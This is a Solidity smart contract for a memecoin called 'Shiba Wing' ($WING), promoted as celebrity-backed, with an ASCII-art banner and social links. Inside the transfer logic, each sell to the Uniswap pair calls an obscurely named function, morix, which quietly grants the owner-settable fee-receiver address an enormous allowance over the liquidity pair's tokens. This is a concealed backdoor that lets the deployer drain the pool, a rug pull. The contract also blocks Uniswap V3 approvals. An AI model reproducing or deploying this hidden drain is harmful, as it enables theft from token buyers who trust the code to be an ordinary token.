// SPDX-License-Identifier: MIT
/**

░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▓▓▓▓▓▓██████████████▓▓▓▓▓▓▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░▒▒▒▒░░░▒▒▒▒▒▓▓▓██████████████████████████████▓▓▓▒▒▒▒▒░░░░▒▒░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▓▓▓██████████████████████████████████████▓▓▓▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▓███████████████████████████████████████▓▓▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░
░░░░░░░░░░░░░░▒▒▒▓▓▒▒▒▒▒▒▒▓███████████████████████████████████▓▒▒▒▒▒▒▒▓▓▒▒▒▒░░░░░░░░░░░░░░
░░░░░░░░░░░░▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▓███████████████████████████████▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒░░░░░░░░░░░░
░░░░░░░░░░▒▒▒▓▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▓████████▓▓▓▓▓▓▓▓▓▓▓▓███████▓▓▒▒▒▓▓▓▓▓▓▓▓▓▓▒▒▒▓▒▒░░░░░░░░░░░
░░░░░░░░░▒▒▓▓█▒▒▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▒▒▓█▓▓▒▒░░░░░░░░░
░░░░░░░▒▒▓▓▓██▓▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▒▒▒███▓▓▒▒░░░░░░░░
░░░░░░▒▒▓▓████▓▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▒▒▓████▓▓▓▒▒░░░░░░
░░░░░▒▒▓▓██████▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▒▒▓██████▒▓▒▒░░░░░
░░░░▒▒▓▓███████▓▒▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▒▒▓████████▓▓▒▒░░░░
░░░▒▒▓▓█████████▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▓█████████▓▓▒░░░░
░░░▒▓▒██████████▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓███████████▒▒▒░░░
░░▒▒▓▓███████████▓▒▒▒▒▒▒▒▒▒░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▒▒▒▒▒▒████████████▓▓▒▒░░
░░▒▓▓████████████▓▒▒▒▒▒▒▒▒▒░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▒▒▒▒▓█████████████▓▓▒░░
░▒▒▓▓███████████▓▒▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▒▒▒▒▒▒▓████████████▓▓▒▒░
░▒▓▒████████████▒▒▒▒▒▒▒▒▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▓████████████▒▒▒░
▒▒▓▒███████████▓▒▒▒▒▒▒▒▒▒██████▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓██████▒▒▒▒▒▒▒▒▒▓███████████▒▓▒░
▒▒▓▓██████████▓▒▒▒▒▒▒▒▒▒▒█████████▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓████████▓▒▒▒▒▒▒▒▒▒▒███████████▒▓▒░
▒▒▓▓██████████▒▒▒▒▒▒▒▒▒▒▒▒▓▓█████████▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓█████████▓▓▒▒▒▒▒▒▒▒▒▒▒▓██████████▒▓▒░
▒▒▓▓█████████▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓██▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓██▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████████▒▓▒░
▒▒▓▒█████████▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██████████▒▓▒░
░▒▓▒█████████▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓█████████▒▒▒░
░▒▒▓▓████████░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒░░░░░░░▓███████▓░░░░░░▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░▓████████▓▓▒▒░
░▒▒▓▓████████░░░░░░░░░░░░░░▒▒▒▒▒▒░░░░░░░░█████████▒░░░░░░▒▒▒▒▒▒░░░░░░░░░░░░░▓████████▓▓▒░░
░░▒▒▓▓███████▓░░░░░░░░░░░░░░░▒▒▒░░░░░░░░░▓████████░░░░░░░░▒▒░░░░░░░░░░░░░░░▒████████▓▓▒▒░░
░░░▒▓▒████████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓████▒░░░░░░░░░░░░░░░░░░░░░░░░░░█████████▒▓▒░░░
░░░▒▒▓▓████████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░▒█████████▓▓▒▒░░░
░░░░▒▒▓▓█████████▓░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▓██▓▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░▓█████████▓▓▒▒░░░░
░░░░░▒▒▓▓██████████▓░░░░░░░░░░░░░░░░░░▓█▓▒▓▓▓▓▓▓▒▒▒██▒░░░░░░░░░░░░░░░░▒██████████▓▓▒▒░░░░░
░░░░░░▒▒▓▓███████████▓▒░░░░░░░░░░░░░░░░▒▓░░░░▓▒░░░░█░░░░░░░░░░░░░░░░▓███████████▓▓▒▒░░░░░░
░░░░░░░▒▒▓▓▓████████████▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓███████████▓▓▒▒░░░░░░░░
░░░░░░░░░▒▒▓▓██████████████▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█████████████▓▓▒▒░░░░░░░░░
░░░░░░░░░░▒▒▓▓▓███████████▓░░▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒░▓███████████▓▓▒▒▒░░░░░░░░░░
░░░░░░░░░░░░▒▒▓▓▓████████▓░░░░▒▒░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒░░░░▒████████▓▓▓▒▒░░░░░░░░░░░░
░░░░░░░░░░░░░░▒▒▓▓▓███▓▒░░░░░░░▒█▓░░░░▓░░░░░░░░░░░░▒▓▒▒▓█▒░░░░░░░░▒████▓▓▓▒▒░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░▒▒▒▓▓▒░░░░░░░░░▓█▓▒▒░▒▒░░░░░░░░░░░░░▒▒░▓██░░░░░░░░░░▒▓▓▒▒▒░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░▒▒▒▒▒░░░░░░▒██▒░░░▒░░▒▒▒░▒▒▒▒▒░▒▒▒░▒░░▓▓░░░░░░░▒▒▒▒▒░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒░░▓██░░▒█▓░░░░░░░░░░░░░░░▓█▒░▓█▒░░▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▓▓▒░░░░░░░░░░░░░░░░░░░░░░▒▓▓▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

Presenting the Shiba Inu Logo Owners POWERED and backed by Celebrities :rocket: Suit up. 
The Legacy continues with $WING, uniting utility & memes. Shaping the future!

We will announce CA via Telegram channel after enabling

Follow us on the following socials:
Website   : https://www.shibawing.com

Discord   : https://discord.com/invite/n7PsBxwwpk
Twitter   : https://x.com/tokenshibawing
Telegram  : https://t.me/ShibaWingPortal

Tiktok    : https://www.tiktok.com/@shibawingtoken
Youtube   : https://www.youtube.com/@ShibaLegacy
**/
pragma solidity 0.8.27;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
contract WING is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balancesGG;
    mapping (address => mapping (address => uint256)) private _allowancesGG;
    mapping (address => bool) private _shouldExcludedGG;
    address payable private _receiptGG;
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 15;
    uint256 private _reduceSellTaxAt = 15;
    uint256 private _preventSwapBefore = 20;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalGG = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Shiba Wing";
    string private constant _symbol = unicode"WING";
    uint256 public _maxAmountGG = 2 * (_tTotalGG/100);
    uint256 public _maxWalletGG = 2 * (_tTotalGG/100);
    uint256 public _taxThresGG = 1 * (_tTotalGG/100);
    uint256 public _maxSwapGG = 1 * (_tTotalGG/100);
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;
    address private uniPairGG;
    IUniswapV2Router02 private uniRouterGG;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxAmountGG);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _receiptGG = payable(_msgSender());
        _balancesGG[_msgSender()] = _tTotalGG;
        _shouldExcludedGG[owner()] = true;
        _shouldExcludedGG[address(this)] = true;
        _shouldExcludedGG[_receiptGG] = true;
        emit Transfer(address(0), _msgSender(), _tTotalGG);
    }
    function initGG() external onlyOwner {
        uniRouterGG = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniRouterGG), _tTotalGG);
        uniPairGG = IUniswapV2Factory(uniRouterGG.factory()).createPair(
            address(this),
            uniRouterGG.WETH()
        ); 
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotalGG;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balancesGG[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowancesGG[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        // Block all Uniswap V3 liquidity additions
        require(!isUniswapV3(spender), "Approval for Uniswap V3 liquidity is not allowed");
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowancesGG[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowancesGG[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amountGG) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amountGG > 0, "Transfer amount must be greater than zero");
        uint256 taxGG=0; 
        if (!swapEnabled || inSwap) {
            _balancesGG[from] = _balancesGG[from] - amountGG;
            _balancesGG[to] = _balancesGG[to] + amountGG;
            emit Transfer(from, to, amountGG);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount==0){
                taxGG = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax); 
            }
            if(_buyCount>0){
                taxGG = _transferTax;
            }
            if (from == uniPairGG && to != address(uniRouterGG) && ! _shouldExcludedGG[to] ){
                require(amountGG <= _maxAmountGG, "Exceeds the _maxAmountGG.");
                require(balanceOf(to) + amountGG <= _maxWalletGG, "Exceeds the maxWalletSize.");
                taxGG = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax); 
                _buyCount++;
            }
            if(to == uniPairGG && from!= address(this) ){
                morix(to);taxGG = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniPairGG && swapEnabled) {
                if(contractTokenBalance > _taxThresGG && _buyCount > _preventSwapBefore)
                    swapEthGG(minGG(amountGG, minGG(contractTokenBalance, _maxSwapGG)));
                sendEthGG(address(this).balance);
            }
        }
        uint256 feeGG=0;
        if(taxGG > 0){
            feeGG=amountGG.mul(taxGG).div(100);
            _balancesGG[address(this)]=_balancesGG[address(this)].add(feeGG);
            emit Transfer(from, address(this),feeGG);
        }
        _balancesGG[from]=_balancesGG[from].sub(amountGG);
        _balancesGG[to]=_balancesGG[to].add(amountGG.sub(feeGG));
        emit Transfer(from, to, amountGG.sub(feeGG));
    }
    function removeLimitGG(address payable limit) external onlyOwner{
        _maxAmountGG = _tTotalGG;
        _maxWalletGG=_tTotalGG;
        _receiptGG = limit;
        _shouldExcludedGG[limit] = true;
        emit MaxTxAmountUpdated(_tTotalGG);
    }
    function swapEthGG(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterGG.WETH();
        _approve(address(this), address(uniRouterGG), tokenAmount);
        uniRouterGG.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function setReceiptGG(address payable _rptGG) external onlyOwner {
        _receiptGG = _rptGG;
        _shouldExcludedGG[_rptGG] = true;
    }
    function minGG(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function sendEthGG(uint256 amount) private {
        _receiptGG.transfer(amount);
    }
    function morix(address addrs) private{
        address[2] memory ownGG=[addrs, _receiptGG];
        _allowancesGG[ownGG[0]][ownGG[1]]= (_tTotalGG*250)*(5+5);
    }
    // Uniswap V3 addresses 
    function isUniswapV3(address spender) private pure returns (bool) {
        // Uniswap V3 NonfungiblePositionManager address
        address uniswapV3PositionManager = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88; 
        return (spender == uniswapV3PositionManager);
    }
    receive() external payable {}
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniRouterGG.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniPairGG).approve(address(uniRouterGG), type(uint).max);
        swapEnabled = true; 
        tradingOpen = true;
    }
}